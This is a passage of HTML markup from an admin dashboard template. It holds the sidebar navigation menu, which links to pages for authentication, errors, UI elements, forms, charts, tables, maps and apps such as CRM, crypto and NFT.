                            <li class="slide side-menu__label1">
                              <a href="javascript:void(0)">Error</a>
                            </li>
                            <li class="slide">
                              <a
                                href="task-kanban-board.html"
                                class="side-menu__item"
                                >Kanban Board</a
                              >
                            </li>
                            <li class="slide">
                              <a
                                href="task-list-view.html"
                                class="side-menu__item"
                                >List View</a
                              >
                            </li>
                            <li class="slide">
                              <a
                                href="task-details.html"
                                class="side-menu__item"
                                >Task Details</a
                              >
                            </li>
                          </ul>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide -->
                        <li class="slide has-sub">
                          <a href="javascript:void(0);" class="side-menu__item">
                            <i class="bx bx-fingerprint side-menu__icon"></i>
                            <span class="side-menu__label">Authentication</span>
                            <i class="fe fe-chevron-right side-menu__angle"></i>
                          </a>
                          <ul
                            class="slide-menu child1"
                            style="
                              position: relative;
                              left: 0px;
                              top: 0px;
                              margin: 0px;
                              transform: translate(120px, 271px);
                            "
                            data-popper-placement="top"
                          >
                            <li class="slide side-menu__label1">
                              <a href="javascript:void(0)">Authentication</a>
                            </li>
                            <li class="slide">
                              <a href="coming-soon.html" class="side-menu__item"
                                >Coming Soon</a
                              >
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Create Password
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="create-password-basic.html"
                                    class="side-menu__item"
                                    >Basic</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="create-password-cover.html"
                                    class="side-menu__item"
                                    >Cover</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Lock Screen
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="lockscreen-basic.html"
                                    class="side-menu__item"
                                    >Basic</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="lockscreen-cover.html"
                                    class="side-menu__item"
                                    >Cover</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Reset Password
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="reset-password-basic.html"
                                    class="side-menu__item"
                                    >Basic</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="reset-password-cover.html"
                                    class="side-menu__item"
                                    >Cover</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Sign Up
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="sign-up-basic.html"
                                    class="side-menu__item"
                                    >Basic</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="sign-up-cover.html"
                                    class="side-menu__item"
                                    >Cover</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Sign In
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="sign-in-basic.html"
                                    class="side-menu__item"
                                    >Basic</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="sign-in-cover.html"
                                    class="side-menu__item"
                                    >Cover</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Two Step Verification
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="two-step-verification-basic.html"
                                    class="side-menu__item"
                                    >Basic</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="two-step-verification-cover.html"
                                    class="side-menu__item"
                                    >Cover</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide">
                              <a
                                href="under-maintenance.html"
                                class="side-menu__item"
                                >Under Maintenance</a
                              >
                            </li>
                          </ul>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide -->
                        <li class="slide has-sub">
                          <a href="javascript:void(0);" class="side-menu__item">
                            <i class="bx bx-error side-menu__icon"></i>
                            <span class="side-menu__label">Error</span>
                            <i class="fe fe-chevron-right side-menu__angle"></i>
                          </a>
                          <ul
                            class="slide-menu child1"
                            style="
                              position: relative;
                              left: 0px;
                              top: 0px;
                              margin: 0px;
                              transform: translate(120px, 314px);
                            "
                            data-popper-placement="top"
                            data-popper-reference-hidden=""
                            data-popper-escaped=""
                          >
                            <li class="slide side-menu__label1">
                              <a href="javascript:void(0)">Error</a>
                            </li>
                            <li class="slide">
                              <a href="401-error.html" class="side-menu__item"
                                >401 - Error</a
                              >
                            </li>
                            <li class="slide">
                              <a href="404-error.html" class="side-menu__item"
                                >404 - Error</a
                              >
                            </li>
                            <li class="slide">
                              <a href="500-error.html" class="side-menu__item"
                                >500 - Error</a
                              >
                            </li>
                          </ul>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide__category -->
                        <li class="slide__category">
                          <span class="category-name">General</span>
                        </li>
                        <!-- End::slide__category -->
                        <!-- Start::slide -->
                        <li class="slide has-sub">
                          <a href="javascript:void(0);" class="side-menu__item">
                            <i class="bx bx-box side-menu__icon"></i>
                            <span class="side-menu__label">Ui Elements</span>
                            <i class="fe fe-chevron-right side-menu__angle"></i>
                          </a>
                          <ul
                            class="slide-menu child1 mega-menu"
                            style="
                              position: relative;
                              left: 0px;
                              top: 0px;
                              margin: 0px;
                              transform: translate(120px, 395px);
                            "
                            data-popper-placement="top"
                            data-popper-reference-hidden=""
                            data-popper-escaped=""
                          >
                            <li class="slide side-menu__label1">
                              <a href="javascript:void(0)">Ui Elements</a>
                            </li>
                            <li class="slide">
                              <a href="alerts.html" class="side-menu__item"
                                >Alerts</a
                              >
                            </li>
                            <li class="slide">
                              <a href="badge.html" class="side-menu__item"
                                >Badge</a
                              >
                            </li>
                            <li class="slide">
                              <a href="breadcrumb.html" class="side-menu__item"
                                >Breadcrumb</a
                              >
                            </li>
                            <li class="slide">
                              <a href="buttons.html" class="side-menu__item"
                                >Buttons</a
                              >
                            </li>
                            <li class="slide">
                              <a href="buttongroup.html" class="side-menu__item"
                                >Button Group</a
                              >
                            </li>
                            <li class="slide">
                              <a href="cards.html" class="side-menu__item"
                                >Cards</a
                              >
                            </li>
                            <li class="slide">
                              <a href="dropdowns.html" class="side-menu__item"
                                >Dropdowns</a
                              >
                            </li>
                            <li class="slide">
                              <a
                                href="images_figures.html"
                                class="side-menu__item"
                                >Images &amp; Figures</a
                              >
                            </li>
                            <li class="slide">
                              <a href="listgroup.html" class="side-menu__item"
                                >List Group</a
                              >
                            </li>
                            <li class="slide">
                              <a href="navs_tabs.html" class="side-menu__item"
                                >Navs &amp; Tabs</a
                              >
                            </li>
                            <li class="slide">
                              <a href="object-fit.html" class="side-menu__item"
                                >Object Fit</a
                              >
                            </li>
                            <li class="slide">
                              <a href="pagination.html" class="side-menu__item"
                                >Pagination</a
                              >
                            </li>
                            <li class="slide">
                              <a href="popovers.html" class="side-menu__item"
                                >Popovers</a
                              >
                            </li>
                            <li class="slide">
                              <a href="progress.html" class="side-menu__item"
                                >Progress</a
                              >
                            </li>
                            <li class="slide">
                              <a href="spinners.html" class="side-menu__item"
                                >Spinners</a
                              >
                            </li>
                            <li class="slide">
                              <a href="toasts.html" class="side-menu__item"
                                >Toasts</a
                              >
                            </li>
                            <li class="slide">
                              <a href="tooltips.html" class="side-menu__item"
                                >Tooltips</a
                              >
                            </li>
                            <li class="slide">
                              <a href="typography.html" class="side-menu__item"
                                >Typography</a
                              >
                            </li>
                          </ul>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide -->
                        <li class="slide has-sub">
                          <a href="javascript:void(0);" class="side-menu__item">
                            <i class="bx bx-medal side-menu__icon"></i>
                            <span class="side-menu__label">Utilities</span>
                            <i class="fe fe-chevron-right side-menu__angle"></i>
                          </a>
                          <ul
                            class="slide-menu child1"
                            style="
                              position: relative;
                              left: 0px;
                              top: 0px;
                              margin: 0px;
                              transform: translate(120px, 437px);
                            "
                            data-popper-placement="top"
                            data-popper-reference-hidden=""
                            data-popper-escaped=""
                          >
                            <li class="slide side-menu__label1">
                              <a href="javascript:void(0)">Utilities</a>
                            </li>
                            <li class="slide">
                              <a href="avatars.html" class="side-menu__item"
                                >Avatars</a
                              >
                            </li>
                            <li class="slide">
                              <a href="borders.html" class="side-menu__item"
                                >Borders</a
                              >
                            </li>
                            <li class="slide">
                              <a href="breakpoints.html" class="side-menu__item"
                                >Breakpoints</a
                              >
                            </li>
                            <li class="slide">
                              <a href="colors.html" class="side-menu__item"
                                >Colors</a
                              >
                            </li>
                            <li class="slide">
                              <a href="columns.html" class="side-menu__item"
                                >Columns</a
                              >
                            </li>
                            <li class="slide">
                              <a href="flex.html" class="side-menu__item"
                                >Flex</a
                              >
                            </li>
                            <li class="slide">
                              <a href="gutters.html" class="side-menu__item"
                                >Gutters</a
                              >
                            </li>
                            <li class="slide">
                              <a href="helpers.html" class="side-menu__item"
                                >Helpers</a
                              >
                            </li>
                            <li class="slide">
                              <a href="position.html" class="side-menu__item"
                                >Position</a
                              >
                            </li>
                            <li class="slide">
                              <a href="more.html" class="side-menu__item"
                                >Additional Content</a
                              >
                            </li>
                          </ul>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide -->
                        <li class="slide has-sub">
                          <a href="javascript:void(0);" class="side-menu__item">
                            <i class="bx bx-file side-menu__icon"></i>
                            <span class="side-menu__label">Forms</span>
                            <i class="fe fe-chevron-right side-menu__angle"></i>
                          </a>
                          <ul
                            class="slide-menu child1"
                            style="
                              position: relative;
                              left: 0px;
                              top: 0px;
                              margin: 0px;
                              transform: translate(120px, 479px);
                            "
                            data-popper-placement="top"
                            data-popper-reference-hidden=""
                            data-popper-escaped=""
                          >
                            <li class="slide side-menu__label1">
                              <a href="javascript:void(0)">Forms</a>
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Form Elements
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="form_inputs.html"
                                    class="side-menu__item"
                                    >Inputs</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="form_check_radios.html"
                                    class="side-menu__item"
                                    >Checks &amp; Radios</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="form_input_group.html"
                                    class="side-menu__item"
                                    >Input Group</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="form_select.html"
                                    class="side-menu__item"
                                    >Form Select</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="form_range.html"
                                    class="side-menu__item"
                                    >Range Slider</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="form_input_masks.html"
                                    class="side-menu__item"
                                    >Input Masks</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="form_file_uploads.html"
                                    class="side-menu__item"
                                    >File Uploads</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="form_dateTime_pickers.html"
                                    class="side-menu__item"
                                    >Date,Time Picker</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="form_color_pickers.html"
                                    class="side-menu__item"
                                    >Color Pickers</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide">
                              <a
                                href="floating_labels.html"
                                class="side-menu__item"
                                >Floating Labels</a
                              >
                            </li>
                            <li class="slide">
                              <a href="form_layout.html" class="side-menu__item"
                                >Form Layouts</a
                              >
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Form Editors
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="quill_editor.html"
                                    class="side-menu__item"
                                    >Quill Editor</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide">
                              <a
                                href="form_validation.html"
                                class="side-menu__item"
                                >Validation</a
                              >
                            </li>
                            <li class="slide">
                              <a
                                href="form_select2.html"
                                class="side-menu__item"
                                >Select2</a
                              >
                            </li>
                          </ul>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide -->
                        <li class="slide has-sub">
                          <a href="javascript:void(0);" class="side-menu__item">
                            <i class="bx bx-party side-menu__icon"></i>
                            <span class="side-menu__label">Advanced Ui</span>
                            <i class="fe fe-chevron-right side-menu__angle"></i>
                          </a>
                          <ul
                            class="slide-menu child1"
                            style="
                              position: relative;
                              left: 0px;
                              top: 0px;
                              margin: 0px;
                              transform: translate(120px, 522px);
                            "
                            data-popper-placement="top"
                            data-popper-reference-hidden=""
                            data-popper-escaped=""
                          >
                            <li class="slide side-menu__label1">
                              <a href="javascript:void(0)">Advanced Ui</a>
                            </li>
                            <li class="slide">
                              <a
                                href="accordions_collpase.html"
                                class="side-menu__item"
                                >Accordions &amp; Collapse</a
                              >
                            </li>
                            <li class="slide">
                              <a href="carousel.html" class="side-menu__item"
                                >Carousel</a
                              >
                            </li>
                            <li class="slide">
                              <a
                                href="draggable-cards.html"
                                class="side-menu__item"
                                >Draggable Cards</a
                              >
                            </li>
                            <li class="slide">
                              <a
                                href="modals_closes.html"
                                class="side-menu__item"
                                >Modals &amp; Closes</a
                              >
                            </li>
                            <li class="slide">
                              <a href="navbar.html" class="side-menu__item"
                                >Navbar</a
                              >
                            </li>
                            <li class="slide">
                              <a href="offcanvas.html" class="side-menu__item"
                                >Offcanvas</a
                              >
                            </li>
                            <li class="slide">
                              <a
                                href="placeholders.html"
                                class="side-menu__item"
                                >Placeholders</a
                              >
                            </li>
                            <li class="slide">
                              <a href="ratings.html" class="side-menu__item"
                                >Ratings</a
                              >
                            </li>
                            <li class="slide">
                              <a href="scrollspy.html" class="side-menu__item"
                                >Scrollspy</a
                              >
                            </li>
                            <li class="slide">
                              <a href="swiperjs.html" class="side-menu__item"
                                >Swiper JS</a
                              >
                            </li>
                          </ul>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide -->
                        <li class="slide">
                          <a href="widgets.html" class="side-menu__item">
                            <i class="bx bx-gift side-menu__icon"></i>
                            <span class="side-menu__label"
                              >Widgets<span
                                class="badge bg-danger-transparent ms-2"
                                >Hot</span
                              ></span
                            >
                          </a>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide__category -->
                        <li class="slide__category">
                          <span class="category-name">Web Apps</span>
                        </li>
                        <!-- End::slide__category -->
                        <!-- Start::slide -->
                        <li class="slide has-sub">
                          <a href="javascript:void(0);" class="side-menu__item">
                            <i class="bx bx-grid-alt side-menu__icon"></i>
                            <span class="side-menu__label"
                              >Apps<span
                                class="badge bg-secondary-transparent ms-2"
                                >New</span
                              ></span
                            >
                            <i class="fe fe-chevron-right side-menu__angle"></i>
                          </a>
                          <ul
                            class="slide-menu child1"
                            style="
                              position: relative;
                              left: 0px;
                              top: 0px;
                              margin: 0px;
                              transform: translate(120px, 645px);
                            "
                            data-popper-placement="top"
                            data-popper-reference-hidden=""
                            data-popper-escaped=""
                          >
                            <li class="slide side-menu__label1">
                              <a href="javascript:void(0)">Apps</a>
                            </li>
                            <li class="slide">
                              <a
                                href="full-calendar.html"
                                class="side-menu__item"
                                >Full Calendar</a
                              >
                            </li>
                            <li class="slide">
                              <a href="gallery.html" class="side-menu__item"
                                >Gallery</a
                              >
                            </li>
                            <li class="slide">
                              <a
                                href="sweet_alerts.html"
                                class="side-menu__item"
                                >Sweet Alerts</a
                              >
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Projects<span
                                  class="badge bg-secondary-transparent ms-2"
                                  >New</span
                                >
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="projects-list.html"
                                    class="side-menu__item"
                                    >Projects List</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="projects-overview.html"
                                    class="side-menu__item"
                                    >Project Overview</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="projects-create.html"
                                    class="side-menu__item"
                                    >Create Project</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Jobs<span
                                  class="badge bg-secondary-transparent ms-2"
                                  >New</span
                                >
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="job-details.html"
                                    class="side-menu__item"
                                    >Job Details</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="job-company-search.html"
                                    class="side-menu__item"
                                    >Search Company</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="job-search.html"
                                    class="side-menu__item"
                                    >Search Jobs</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="job-post.html"
                                    class="side-menu__item"
                                    >Job Post</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="jobs-list.html"
                                    class="side-menu__item"
                                    >Jobs List</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="job-candidate-search.html"
                                    class="side-menu__item"
                                    >Search Candidate</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="job-candidate-details.html"
                                    class="side-menu__item"
                                    >Candidate Details</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >NFT<span
                                  class="badge bg-secondary-transparent ms-2"
                                  >New</span
                                >
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="nft-marketplace.html"
                                    class="side-menu__item"
                                    >Market Place</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="nft-details.html"
                                    class="side-menu__item"
                                    >NFT Details</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="nft-create.html"
                                    class="side-menu__item"
                                    >Create NFT</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="nft-wallet-integration.html"
                                    class="side-menu__item"
                                    >Wallet Integration</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="nft-live-auction.html"
                                    class="side-menu__item"
                                    >Live Auction</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >CRM<span
                                  class="badge bg-secondary-transparent ms-2"
                                  >New</span
                                >
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="crm-contacts.html"
                                    class="side-menu__item"
                                    >Contacts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="crm-companies.html"
                                    class="side-menu__item"
                                    >Companies</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="crm-deals.html"
                                    class="side-menu__item"
                                    >Deals</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="crm-leads.html"
                                    class="side-menu__item"
                                    >Leads</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Crypto<span
                                  class="badge bg-secondary-transparent ms-2"
                                  >New</span
                                >
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="crypto-transactions.html"
                                    class="side-menu__item"
                                    >Transactions</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="crypto-currency-exchange.html"
                                    class="side-menu__item"
                                    >Currency Exchange</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="crypto-buy_sell.html"
                                    class="side-menu__item"
                                    >Buy &amp; Sell</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="crypto-marketcap.html"
                                    class="side-menu__item"
                                    >Marketcap</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="crypto-wallet.html"
                                    class="side-menu__item"
                                    >Wallet</a
                                  >
                                </li>
                              </ul>
                            </li>
                          </ul>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide -->
                        <li class="slide has-sub">
                          <a href="javascript:void(0);" class="side-menu__item">
                            <i class="bx bx-layer side-menu__icon"></i>
                            <span class="side-menu__label">Nested Menu</span>
                            <i class="fe fe-chevron-right side-menu__angle"></i>
                          </a>
                          <ul
                            class="slide-menu child1"
                            style="
                              position: relative;
                              left: 0px;
                              top: 0px;
                              margin: 0px;
                              transform: translate(120px, 687px);
                            "
                            data-popper-placement="top"
                            data-popper-reference-hidden=""
                            data-popper-escaped=""
                          >
                            <li class="slide side-menu__label1">
                              <a href="javascript:void(0)">Nested Menu</a>
                            </li>
                            <li class="slide">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Nested-1</a
                              >
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Nested-2
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="javascript:void(0);"
                                    class="side-menu__item"
                                    >Nested-2-1</a
                                  >
                                </li>
                                <li class="slide has-sub">
                                  <a
                                    href="javascript:void(0);"
                                    class="side-menu__item"
                                    >Nested-2-2
                                    <i
                                      class="fe fe-chevron-right side-menu__angle"
                                    ></i
                                  ></a>
                                  <ul class="slide-menu child3">
                                    <li class="slide">
                                      <a
                                        href="javascript:void(0);"
                                        class="side-menu__item"
                                        >Nested-2-2-1</a
                                      >
                                    </li>
                                    <li class="slide">
                                      <a
                                        href="javascript:void(0);"
                                        class="side-menu__item"
                                        >Nested-2-2-2</a
                                      >
                                    </li>
                                  </ul>
                                </li>
                              </ul>
                            </li>
                          </ul>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide__category -->
                        <li class="slide__category">
                          <span class="category-name">Tables &amp; Charts</span>
                        </li>
                        <!-- End::slide__category -->
                        <!-- Start::slide -->
                        <li class="slide has-sub">
                          <a href="javascript:void(0);" class="side-menu__item">
                            <i class="bx bx-table side-menu__icon"></i>
                            <span class="side-menu__label"
                              >Tables<span
                                class="badge bg-success-transparent ms-2"
                                >3</span
                              ></span
                            >
                            <i class="fe fe-chevron-right side-menu__angle"></i>
                          </a>
                          <ul
                            class="slide-menu child1"
                            style="
                              position: relative;
                              left: 0px;
                              top: 0px;
                              margin: 0px;
                              transform: translate(120px, 768px);
                            "
                            data-popper-reference-hidden=""
                            data-popper-escaped=""
                            data-popper-placement="top"
                          >
                            <li class="slide side-menu__label1">
                              <a href="javascript:void(0)">Tables</a>
                            </li>
                            <li class="slide">
                              <a href="tables.html" class="side-menu__item"
                                >Tables</a
                              >
                            </li>
                            <li class="slide">
                              <a href="grid-tables.html" class="side-menu__item"
                                >Grid JS Tables</a
                              >
                            </li>
                            <li class="slide">
                              <a href="data-tables.html" class="side-menu__item"
                                >Data Tables</a
                              >
                            </li>
                          </ul>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide -->
                        <li class="slide has-sub">
                          <a href="javascript:void(0);" class="side-menu__item">
                            <i
                              class="bx bx-bar-chart-square side-menu__icon"
                            ></i>
                            <span class="side-menu__label">Charts</span>
                            <i class="fe fe-chevron-right side-menu__angle"></i>
                          </a>
                          <ul
                            class="slide-menu child1"
                            style="
                              position: relative;
                              left: 0px;
                              top: 0px;
                              margin: 0px;
                              transform: translate(120px, 811px);
                            "
                            data-popper-reference-hidden=""
                            data-popper-escaped=""
                            data-popper-placement="top"
                          >
                            <li class="slide side-menu__label1">
                              <a href="javascript:void(0)">Charts</a>
                            </li>
                            <li class="slide has-sub">
                              <a
                                href="javascript:void(0);"
                                class="side-menu__item"
                                >Apex Charts
                                <i
                                  class="fe fe-chevron-right side-menu__angle"
                                ></i
                              ></a>
                              <ul class="slide-menu child2">
                                <li class="slide">
                                  <a
                                    href="apex-line-charts.html"
                                    class="side-menu__item"
                                    >Line Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-area-charts.html"
                                    class="side-menu__item"
                                    >Area Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-column-charts.html"
                                    class="side-menu__item"
                                    >Column Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-bar-charts.html"
                                    class="side-menu__item"
                                    >Bar Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-mixed-charts.html"
                                    class="side-menu__item"
                                    >Mixed Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-rangearea-charts.html"
                                    class="side-menu__item"
                                    >Range Area Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-timeline-charts.html"
                                    class="side-menu__item"
                                    >Timeline Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-candlestick-charts.html"
                                    class="side-menu__item"
                                    >CandleStick Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-boxplot-charts.html"
                                    class="side-menu__item"
                                    >Boxplot Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-bubble-charts.html"
                                    class="side-menu__item"
                                    >Bubble Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-scatter-charts.html"
                                    class="side-menu__item"
                                    >Scatter Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-heatmap-charts.html"
                                    class="side-menu__item"
                                    >Heatmap Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-treemap-charts.html"
                                    class="side-menu__item"
                                    >Treemap Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-pie-charts.html"
                                    class="side-menu__item"
                                    >Pie Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-radialbar-charts.html"
                                    class="side-menu__item"
                                    >Radialbar Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-radar-charts.html"
                                    class="side-menu__item"
                                    >Radar Charts</a
                                  >
                                </li>
                                <li class="slide">
                                  <a
                                    href="apex-polararea-charts.html"
                                    class="side-menu__item"
                                    >Polararea Charts</a
                                  >
                                </li>
                              </ul>
                            </li>
                            <li class="slide">
                              <a
                                href="chartjs-charts.html"
                                class="side-menu__item"
                                >Chartjs Charts</a
                              >
                            </li>
                            <li class="slide">
                              <a href="echarts.html" class="side-menu__item"
                                >Echart Charts</a
                              >
                            </li>
                          </ul>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide__category -->
                        <li class="slide__category">
                          <span class="category-name">Maps &amp; Icons</span>
                        </li>
                        <!-- End::slide__category -->
                        <!-- Start::slide -->
                        <li class="slide has-sub">
                          <a href="javascript:void(0);" class="side-menu__item">
                            <i class="bx bx-map side-menu__icon"></i>
                            <span class="side-menu__label">Maps</span>
                            <i class="fe fe-chevron-right side-menu__angle"></i>
                          </a>
                          <ul
                            class="slide-menu child1"
                            style="
                              position: relative;
                              left: 0px;
                              top: 0px;
                              margin: 0px;
                              transform: translate(120px, 891px);
                            "
                            data-popper-reference-hidden=""
                            data-popper-escaped=""
                            data-popper-placement="top"
                          >
                            <li class="slide side-menu__label1">
                              <a href="javascript:void(0)">Maps</a>
                            </li>
                            <li class="slide">
                              <a href="google-maps.html" class="side-menu__item"
                                >Google Maps</a
                              >
                            </li>
                            <li class="slide">
                              <a
                                href="leaflet-maps.html"
                                class="side-menu__item"
                                >Leaflet Maps</a
                              >
                            </li>
                            <li class="slide">
                              <a href="vector-maps.html" class="side-menu__item"
                                >Vector Maps</a
                              >
                            </li>
                          </ul>
                        </li>
                        <!-- End::slide -->
                        <!-- Start::slide -->
                        <li class="slide">
                          <a href="icons.html" class="side-menu__item">
                            <i class="bx bx-store-alt side-menu__icon"></i>
                            <span class="side-menu__label">Icons</span>
                          </a>
                        </li>
                        <!-- End::slide -->
                      </ul>
                      <div class="slide-right d-none" id="slide-right">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          fill="#7b8191"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                        >
                          <path
                            d="M10.707 17.707 16.414 12l-5.707-5.707-1.414 1.414L13.586 12l-4.293 4.293z"
                          ></path>
                        </svg>
                      </div>
                    </nav>
                    <!-- End::nav -->
                  </div>
                </div>
              </div>
            </div>
            <div
              class="simplebar-placeholder"
              style="width: auto; height: 1013px"
            ></div>
          </div>
          <div
            class="simplebar-track simplebar-horizontal"
            style="visibility: hidden"
          >
            <div
              class="simplebar-scrollbar"
              style="width: 0px; display: none"
            ></div>
          </div>
          <div
            class="simplebar-track simplebar-vertical"
            style="visibility: visible"
          >
            <div
              class="simplebar-scrollbar"
              style="
                height: 74px;
                transform: translate3d(0px, 0px, 0px);
                display: block;
              "
            ></div>
          </div>
        </div>
        <!-- End::main-sidebar -->
      </aside>
      <!-- End::app-sidebar -->
      <!-- Start::app-content -->
